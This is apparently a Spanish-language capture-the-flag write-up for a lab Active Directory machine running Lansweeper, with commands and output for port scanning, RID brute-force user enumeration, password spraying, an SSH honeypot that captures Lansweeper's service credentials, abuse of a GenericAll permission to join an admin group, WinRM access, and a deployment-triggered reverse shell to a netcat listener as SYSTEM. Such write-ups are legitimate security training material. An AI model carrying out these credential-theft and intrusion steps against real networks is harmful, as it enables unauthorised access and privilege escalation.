>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.234.177
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-17 12:03 EST
Nmap scan report for 10.129.234.177
Host is up (0.079s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE           VERSION
53/tcp    open  domain?
81/tcp    open  hosts2-ns?
82/tcp    open  xfer?
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
389/tcp   open  ldap?
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  globalcatLDAP?
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server?
5985/tcp  open  wsman?
9389/tcp  open  adws?
49664/tcp open  unknown
49667/tcp open  unknown
52133/tcp open  unknown
52146/tcp open  unknown
59228/tcp open  unknown
63439/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
63440/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.46 seconds
```

>Enumeramos con netexec datos del DC:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ nxc smb 10.129.234.177                                    
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```

>Enumeración de usuarios mediante la técnica **RID brute-force** empleando **Guest Session**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ nxc smb 10.129.234.177 -u 'guest' -p '' --rid-brute 9999
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
SMB         10.129.234.177  445    INVENTORY        498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        500: SWEEP\Administrator (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        501: SWEEP\Guest (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        502: SWEEP\krbtgt (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        512: SWEEP\Domain Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        513: SWEEP\Domain Users (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        514: SWEEP\Domain Guests (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        515: SWEEP\Domain Computers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        516: SWEEP\Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        517: SWEEP\Cert Publishers (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        518: SWEEP\Schema Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        519: SWEEP\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        520: SWEEP\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        521: SWEEP\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        522: SWEEP\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        525: SWEEP\Protected Users (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        526: SWEEP\Key Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        527: SWEEP\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        553: SWEEP\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        1000: SWEEP\INVENTORY$ (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1101: SWEEP\DnsAdmins (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        1102: SWEEP\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        1103: SWEEP\Lansweeper Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        1113: SWEEP\jgre808 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1114: SWEEP\bcla614 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1115: SWEEP\hmar648 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1116: SWEEP\jgar931 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1117: SWEEP\fcla801 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1118: SWEEP\jwil197 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1119: SWEEP\grob171 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1120: SWEEP\fdav736 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1121: SWEEP\jsmi791 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1122: SWEEP\hjoh690 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1123: SWEEP\svc_inventory_win (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1124: SWEEP\svc_inventory_lnx (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1125: SWEEP\intern (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        3101: SWEEP\Lansweeper Discovery (SidTypeGroup)
```

>Tratamos el output anterior para obtener una lista con solo los usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ cat users_raw | grep "SidTypeUser" | awk {'print $2'} FS="\\" | awk {'print $1'} FS=" " > users
```

>Hacemos un **password spray** poniendo el nombre del usuario como credencial y vemos que hay uno válido: `intern:intern`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ kerbrute passwordspray -d sweep.vl users --dc 10.129.234.177 -t 300 --user-as-pass    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/17/26 - Ronnie Flathers @ropnop

2026/01/17 12:08:24 >  Using KDC(s):
2026/01/17 12:08:24 >  	10.129.234.177:88

2026/01/17 12:08:24 >  [+] VALID LOGIN:	intern@sweep.vl:intern
2026/01/17 12:08:24 >  Done! Tested 17 logins (1 successes) in 0.267 seconds
```

>Ingestamos archivos de **bloodhound**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ bloodhound-ce-python -u 'intern' -p 'intern' -k -ns 10.129.234.177 -d sweep.vl -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sweep.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (inventory.sweep.vl:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: inventory.sweep.vl
INFO: Testing resolved hostname connectivity dead:beef::5882:e9a0:8aa1:4df6
INFO: Trying LDAP connection to dead:beef::5882:e9a0:8aa1:4df6
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: inventory.sweep.vl
INFO: Testing resolved hostname connectivity dead:beef::5882:e9a0:8aa1:4df6
INFO: Trying LDAP connection to dead:beef::5882:e9a0:8aa1:4df6
INFO: Found 17 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: inventory.sweep.vl
INFO: Done in 00M 14S
INFO: Compressing output into 20260117121018_bloodhound.zip
```

>Usamos las credenciales del usuario **intern** para acceder al **Lansweeper** que hay en el puerto 81 TCP:

<img width="1470" height="628" alt="image" src="https://github.com/user-attachments/assets/0224663b-eefb-411b-96bc-91b275eb4c25" />

>Ahora vamos a crear un **HoneyPot** de **SSH** para capturar las **credenciales** que va a usar el **Lansweeper** cuando lancemos un **mapeo de red**, recordar que hay que modificar el yaml para que escuche por todas las interfaces y no solo por la local porque si no, el DC no tendrá acceso al puerto: https://github.com/jaksi/sshesame/releases/tag/v0.0.39

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ ./sshesame-linux-amd64 -config sshesame.yaml
INFO 2026/01/17 12:17:26 No host keys configured, using keys at "/home/kali/.local/share/sshesame"
INFO 2026/01/17 12:17:26 Host key "/home/kali/.local/share/sshesame/host_rsa_key" not found, generating it
INFO 2026/01/17 12:17:26 Host key "/home/kali/.local/share/sshesame/host_ecdsa_key" not found, generating it
INFO 2026/01/17 12:17:26 Host key "/home/kali/.local/share/sshesame/host_ed25519_key" not found, generating it
INFO 2026/01/17 12:17:26 Listening on [::]:2022
```

>Ahora vamos a configurar en el **Lansweeper** una red para que nos escanee nuestro dispositivo y capturemos las **credenciales** de **SSH**, recordar configurar el puerto al **2022** que es el que usa nuestro honeypot:

<img width="1468" height="629" alt="image" src="https://github.com/user-attachments/assets/e117551e-3761-424b-b93a-d29fab8edb29" />

>Le damos a scan now y recibimos las credenciales: `svc_inventory_lnx:0|5m-U6?/uAX`

```bash
<SNIP>
2026/01/17 12:36:52 [10.129.234.177:62771] authentication for user "svc_inventory_lnx" without credentials rejected
2026/01/17 12:36:52 [10.129.234.177:62771] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
<SNIP>
```

>Vemos que las credenciales son válidas en el dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ nxc smb 10.129.234.177 -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX'
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\svc_inventory_lnx:0|5m-U6?/uAX 
```

>En Bloodhound vemos que el usuario **svc_inventory_lnx** es miembro del grupo **Lansweeper Discovery** que tiene la ACE **GenericAll** sobre el grupo **Lansweeper Admins** que es miembro del grupo **Remote Management Users**:

<img width="824" height="230" alt="image" src="https://github.com/user-attachments/assets/6b56627e-f6dc-4e9e-a151-bc7e644664e8" />

>Abusamos la ACE **GenericAll** para agregarnos al grupo **Lansweeper admins** para así poder acceder al DC mediante **WinRM**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ bloodyAD --host 10.129.234.177 -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX' add groupMember 'Lansweeper admins' 'svc_inventory_lnx'
[+] svc_inventory_lnx added to Lansweeper admins
```

>Accedemos por **WinRM** y leemos la primera flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ evil-winrm -i 10.129.234.177 -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_inventory_lnx\Documents> cat c:\user.txt
d2d89a58c454428461b1c7b2547f9165
```

>Creamos un deployment que ejecute una reverse shell como el usuario que corre el servicio, recordar iniciar sesión con las credenciales del usuario **svc_inventory_lnx** en la web para que puedan hacerlo:

<img width="1470" height="624" alt="image" src="https://github.com/user-attachments/assets/1afc3363-3b7c-447e-bdef-3d022845c74c" />

>Le damos a **Deploy Now** y elegimos que se ejecute en el equipo **INVENTORY**:

<img width="477" height="350" alt="image" src="https://github.com/user-attachments/assets/6c30a700-2972-4250-b533-dc7af96a5e87" />

>No va a funcionar porque las credenciales no están definidas para el equipo **INVENTORY** así que vamos a mapearlas en **Scanning Credentials**:

<img width="371" height="321" alt="image" src="https://github.com/user-attachments/assets/cf6dc7d1-8916-41c2-a808-c35aa42f6520" />

>Ahora si le volvemos a hacer un deploy recibimos una reverse shell como **SYSTEM** y leemos la última flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sweep]
└─$ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.234.177] 52445

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
71770ae0f007e2aed64425728977cc65
```
